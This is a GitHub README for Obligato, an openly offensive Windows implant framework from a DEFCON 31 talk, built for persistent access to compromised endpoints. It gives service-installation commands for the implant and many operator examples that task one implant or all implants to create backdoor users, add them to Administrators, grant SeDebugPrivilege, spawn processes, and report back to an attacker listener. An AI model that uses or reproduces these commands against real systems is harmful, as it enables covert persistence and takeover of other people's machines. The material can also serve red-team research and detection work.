# Obligato
This project is an implant framework designed for long term persistent access to Windows machines. The goals are centered around disassociating implant tasks and network activity from the implant service. The primary intended use if for maintaining or regaining access to compromised endpoints.

The initial release is the code used in the demos for my DEFCON 31 talk [Malware Design - Abusing legacy Microsoft transports and session architecture](https://forum.defcon.org/node/245731). This does not implement the access controls and transport encryption layers. These features will be pushed after integrating the existing functionality of the command-line agent into the GUI. I am currently the only developer, so community help is welcome!

Please checkout my talk or the companion slides to get more details and specifics on the underlying components, functionality, and use cases.

## Build Instructions & Information
I used Microsoft Visual Studios 2019 and the latest version of the Windows 10 SDK to build this project, so make sure you have the C++ dependencies installed in VS. The ```ObEngine``` project builds a library that is configured as a dependency in the other three projects ```ObAgent```, ```ObClient```, and ```ObService```. To build Obligato, open the solution in Visual Studios, right click the solution, and choose build. This will begin by building the ObEngine library and then proceed to the other projects that leverage it as a dependency. Each of the projects are described in the following sections.

> [!IMPORTANT]
> Currently, only x64 is supported, so you will get build errors if you try to build for x86.

### [ObService](https://github.com/BeetleChunks/Obligato/tree/main/ObService)
This is the implant service executable that is installed on target endpoints.

#### Installation and Updating Defaults
The Obligato service executable can be installed using the following commands. This assumes the ObEngine service binary is located at ***C:\\Windows\\ObService.exe***. If you rename the service binary or change the directory location, update the ***binPath=*** parameter accordingly.

```
sc create ObMailslot start= auto type= share binPath= "C:\Windows\ObService.exe"
sc create ObUdpSocket start= auto type= share binPath= "C:\Windows\ObService.exe"
```

The service names ***ObMailslot*** and ***ObUdpSocket*** are the required service names. Because the process is a ***share*** type, the service names in the service registration handles must match the service names in the service entry table. If you would like to name them something different, you can update the following lines in the ```ObService``` project's [Main.cpp](https://github.com/BeetleChunks/Obligato/blob/main/ObService/src/Main.cpp) file and recompile.

```c++
WCHAR MailslotSvc[]  = L"ObMailslot";
WCHAR UdpSocketSvc[] = L"ObUdpSocket";
...
g_hService = ::RegisterServiceCtrlHandlerEx(L"ObMailslot", ObMailslotHandler, nullptr);
...
g_hService = ::RegisterServiceCtrlHandlerEx(L"ObUdpSocket", ObUdpSocketHandler, nullptr);
```

The default configurations of the ***Mailslot*** and ***UDP socket*** listeners can also be updated in the ```ObService``` project's [Main.cpp](https://github.com/BeetleChunks/Obligato/blob/main/ObService/src/Main.cpp) file.

```c++
ObEngine::StartMailslotServer(std::wstring(L"obligato")); // Mailslot name
...
ObEngine::StartUdpSocketServer(std::wstring(L"0.0.0.0"), 49153); // IPv4 Address & Port
```

### [ObAgent](https://github.com/BeetleChunks/Obligato/tree/main/ObAgent)
This is the command-line agent used to send tasks to remote targets that are implanted and receive the optional responses. This agent can also start the same transport listeners implemented by the ObService. Please note this should only be used for testing because certain functionality within the implant depends on running as system in session 0.

<details>
<summary>Usage</summary>

```
ObAgent.exe [Command] [Options...]
```

| Command          | Category     | Description                               |
| :--------------- | :----------: | :---------------------------------------- |
| StartMsServer    | Server       | Start Mailslot server listener            |
| StartUdpServer   | Server       | Start UDP socket server listener          |
| AddMsNotify      | Notification | Add mailslot notification route           |
| DelMsNotify      | Notification | Remove mailslot notification route        |
| SendMsNotify     | Notification | Send notification via mailslot            |
| AddUdpSocNotify  | Notification | Add UDP socket notification route         |
| DelUdpSocNotify  | Notification | Remove UDP socket notification route      |
| SendUdpSocNotify | Notification | Send notification via UDP socket          |
| AddUser          | Task         | Create local user                         |
| DelUser          | Task         | Delete local user                         |
| AddGroup         | Task         | Create local group                        |
| DelGroup         | Task         | Delete local group                        |
| AddGroupMem      | Task         | Add member to local group                 |
| RmGroupMem       | Task         | Remove member from local group            |
| AddPriv          | Task         | Add privilege to local user or group      |
| RmPriv           | Task         | Remove privilege from local user or group |
| SpwnProc         | Task         | Spawn a process in a user session         |

| Option | Description                                                              |
| :----- | :----------------------------------------------------------------------- |
| -dMs   | Destination Mailslot name that performs the task                         |
| -dNb   | Destination NetBIOS name that performs the task                          |
| -dUA   | Destination UDP socket IPv4 address that performs the task               |
| -dUP   | Destination UDP socket port number that performs the task                |
| -Ms    | Mailslot name for server start or to receive a task's response           |
| -Nb    | NetBIOS name for server start or to receive a task's response            |
| -UA    | UDP socket IPv4 address for server start or to receive a task's response |
| -UP    | UDP socket port number for server start or to receive a task's response  |
| -n     | Notification message                                                     |
| -d     | Domain                                                                   |
| -u     | User                                                                     |
| -p     | Password                                                                 |
| -g     | Group                                                                    |
| -c     | Comment attached to the created group                                    |
| -m     | Member                                                                   |
| -e     | Name of group or user when managing privileges                           |
| -Pr    | Privilege name (i.e. SeDebugPrivilege)                                   |
| -An    | Application name (i.e. C:\\Windows\\System32\\cmd.exe)                   |
| -Aa    | Application arguments                                                    |
| -Ac    | Application current working directory                                    |
| -h     | Print usage and help (***Not yet implemented***)                         |

</details>

<details>
<summary>Examples</summary>

#### StartMsServer
* Start a Mailslot listener
```
ObAgent.exe StartMsServer -Ms obnotify
```

#### StartUdpServer
* Start a UDP socket listener
```
ObAgent.exe StartUdpServer -UA 0.0.0.0 -UP 11337
```

#### AddMsNotify
* Using Mailslots, task a remote implant to add a Mailslot notification route.
```
ObAgent.exe AddMsNotify -dMs obligato -dNb TARGET01 -Ms obnotify -Nb ATTACKER01
```

* Using Mailslots, task ALL remote implants to add a Mailslot notification route.
```
ObAgent.exe AddMsNotify -dMs obligato -dNb * -Ms obnotify -Nb ATTACKER01
```

* Using UDP sockets, task a remote implant to add a Mailslot notification route.
```
ObAgent.exe AddMsNotify -dUP 49153 -dUA 10.0.0.23 -Ms obnotify -Nb ATTACKER01
```

#### DelMsNotify
* Using Mailslots, task a remote implant to delete a Mailslot notification route.
```
ObAgent.exe DelMsNotify -dMs obligato -dNb TARGET01 -Ms obnotify -Nb ATTACKER01
```

* Using Mailslots, task ALL remote implants to delete a Mailslot notification route.
```
ObAgent.exe DelMsNotify -dMs obligato -dNb * -Ms obnotify -Nb ATTACKER01
```

* Using UDP sockets, task a remote implant to delete a Mailslot notification route.
```
ObAgent.exe DelMsNotify -dUP 49153 -dUA 10.0.0.23 -Ms obnotify -Nb ATTACKER01
```

#### SendMsNotify
* Using Mailslots, task a remote implant to send a notification message to a Mailslot listener.
```
ObAgent.exe SendMsNotify -dMs obligato -dNb TARGET01 -Ms obnotify -Nb ATTACKER01 -n "Message routing works!"
```

* Using Mailslots, task ALL remote implants to send a notification message to a Mailslot listener.
```
ObAgent.exe SendMsNotify -dMs obligato -dNb * -Ms obnotify -Nb ATTACKER01 -n "Message routing works!"
```

* Using UDP sockets, task a remote implant to send a notification message to a Mailslot listener.
```
ObAgent.exe SendMsNotify -dUP 49153 -dUA 10.0.0.23 -Ms obnotify -Nb ATTACKER01 -n "Message routing works!"
```

#### AddUdpSocNotify
* Using Mailslots, task a remote implant to add a UDP socket notification route.
```
ObAgent.exe AddUdpSocNotify -dMs obligato -dNb TARGET01 -UP 11337 -UA 10.0.0.85
```

* Using Mailslots, task ALL remote implants to add a UDP socket notification route.
```
ObAgent.exe AddUdpSocNotify -dMs obligato -dNb * -UP 11337 -UA 10.0.0.85
```

* Using UDP sockets, task a remote implant to add a UDP socket notification route.
```
ObAgent.exe AddUdpSocNotify -dUP 49153 -dUA 10.0.0.23 -UP 11337 -UA 10.0.0.85
```

#### DelUdpSocNotify
* Using Mailslots, task a remote implant to delete a UDP socket notification route.
```
ObAgent.exe DelUdpSocNotify -dMs obligato -dNb TARGET01 -UP 11337 -UA 10.0.0.85
```

* Using Mailslots, task ALL remote implants to delete a UDP socket notification route.
```
ObAgent.exe DelUdpSocNotify -dMs obligato -dNb * -UP 11337 -UA 10.0.0.85
```

* Using UDP sockets, task a remote implant to delete a UDP socket notification route.
```
ObAgent.exe DelUdpSocNotify -dUP 49153 -dUA 10.0.0.23 -UP 11337 -UA 10.0.0.85
```

#### SendUdpSocNotify
* Using Mailslots, task a remote implant to send a notification message to a UDP socket listener.
```
ObAgent.exe SendUdpSocNotify -dMs obligato -dNb TARGET01 -UP 11337 -UA 10.0.0.85 -n "Message routing works!"
```

* Using Mailslots, task ALL remote implants to send a notification message to a UDP socket listener.
```
ObAgent.exe SendUdpSocNotify -dMs obligato -dNb * -UP 11337 -UA 10.0.0.85 -n "Message routing works!"
```

* Using UDP sockets, task a remote implant to send a notification message to a UDP socket listener.
```
ObAgent.exe SendUdpSocNotify -dUP 49153 -dUA 10.0.0.23 -UP 11337 -UA 10.0.0.85 -n "Message routing works!"
```

#### AddUser
* Using Mailslots, task a remote implant to create a local user.
```
ObAgent.exe AddUser -dMs obligato -dNb TARGET01 -u dlogmas -p P4ssw0rd
```

* Using Mailslots, task ALL remote implants to create a local user.
```
ObAgent.exe AddUser -dMs obligato -dNb * -u dlogmas -p P4ssw0rd
```

* Using Mailslots, task a remote implant to create a local user and send a response to a Mailslot listener.
```
ObAgent.exe AddUser -dMs obligato -dNb TARGET01 -u dlogmas -p P4ssw0rd -Ms obnotify -Nb ATTACKER01
```

#### DelUser
* Using Mailslots, task a remote implant to delete a local user.
```
ObAgent.exe DelUser -dMs obligato -dNb TARGET01 -u dlogmas
```

* Using Mailslots, task a remote implant to delete a local user and send a response to a UDP socket listener.
```
ObAgent.exe DelUser -dMs obligato -dNb TARGET01 -u dlogmas -UP 11337 -UA 10.0.0.85
```

#### AddGroup
* Using UDP sockets, task a remote implant to create a local group.
```
ObAgent.exe AddGroup -dUP 49153 -dUA 10.0.0.23 -g obgroup -c "Created for Obligato"
```

* Using UDP sockets, task a remote implant to create a local group and send a response to a Mailslot listener.
```
ObAgent.exe AddGroup -dUP 49153 -dUA 10.0.0.23 -g obgroup -c "Created for Obligato" -Ms obnotify -Nb ATTACKER01
```

#### DelGroup
* Using Mailslots, task a remote implant to delete a local group.
```
ObAgent.exe DelGroup -dMs obligato -dNb TARGET01 -g obgroup
```

#### AddGroupMem
* Using Mailslots, task a remote implant to add a local user to a local group.
```
ObAgent.exe AddGroupMem -dMs obligato -dNb TARGET01 -g obgroup -m dlogmas
```

* Using Mailslots, task a remote implant to add a domain user to a local group.
```
ObAgent.exe AddGroupMem -dMs obligato -dNb TARGET01 -g Administrators -m "ecorp\jdoe"
```

* Using Mailslots, task a remote implant to add a local group to the local Administrators group.
```
ObAgent.exe AddGroupMem -dMs obligato -dNb TARGET01 -g Administrators -m "obgroup"
```

#### RmGroupMem
* Using Mailslots, task a remote implant to remove a local user from a local group.
```
ObAgent.exe RmGroupMem -dMs obligato -dNb TARGET01 -g obgroup -m dlogmas
```

* Using Mailslots, task a remote implant to remove a domain user from a local group.
```
ObAgent.exe RmGroupMem -dMs obligato -dNb TARGET01 -g Administrators -m "ecorp\jdoe"
```

* Using Mailslots, task a remote implant to remove a local group from the local Administrators group.
```
ObAgent.exe RmGroupMem -dMs obligato -dNb TARGET01 -g Administrators -m "obgroup"
```

#### AddPriv
* Using Mailslots, task a remote implant to add a privilege to a local user.
```
ObAgent.exe AddPriv -dMs obligato -dNb TARGET01 -Pr SeDebugPrivilege -e dlogmas
```

* Using Mailslots, task a remote implant to add a privilege to a local group.
```
ObAgent.exe AddPriv -dMs obligato -dNb TARGET01 -Pr SeDebugPrivilege -e obgroup
```

#### RmPriv
* Using Mailslots, task a remote implant to remove a privilege from a local user.
```
ObAgent.exe RmPriv -dMs obligato -dNb TARGET01 -Pr SeDebugPrivilege -e dlogmas
```

* Using Mailslots, task a remote implant to remove a privilege from a local group.
```
ObAgent.exe RmPriv -dMs obligato -dNb TARGET01 -Pr SeDebugPrivilege -e obgroup
```

#### SpwnProc
* Using Mailslots, task a remote implant to spawn a process in a local user's logon session.
```
ObAgent.exe SpwnProc -dMs obligato -dNb TARGET01 -An "C:\Windows\System32\cmd.exe" -Aa "/K dir" -Ac "C:\Windows" -d "." -u dlogmas
```

* Using Mailslots, task a remote implant to spawn a process in a domain user's logon session.
```
ObAgent.exe SpwnProc -dMs obligato -dNb TARGET01 -An "C:\Windows\System32\calc.exe" -d "ecorp" -u jdoe
```

</details>

### [ObClient](https://github.com/BeetleChunks/Obligato/tree/main/ObClient)
This is just like the ObAgent except it offers all the features in an easy to use GUI. There are a couple of features in the ObAgent that I am still integrating into this GUI, such as, receiving the optional response notifications. This functionality and the access controls/encryption will be pushed very soon.

### [ObEngine](https://github.com/BeetleChunks/Obligato/tree/main/ObEngine)
This is a library that implements all the functionality of the implant tasking protocol. This is where new transports, tasks, routes, notifications, and other core functionality should be created.

# Disclaimer
This proof-of-concept code has been created for academic research and is not intended to be used against systems except where explicitly authorized. The code is provided as is with no guarantees or promises on its execution. I am not responsible or liable for misuse of this code.
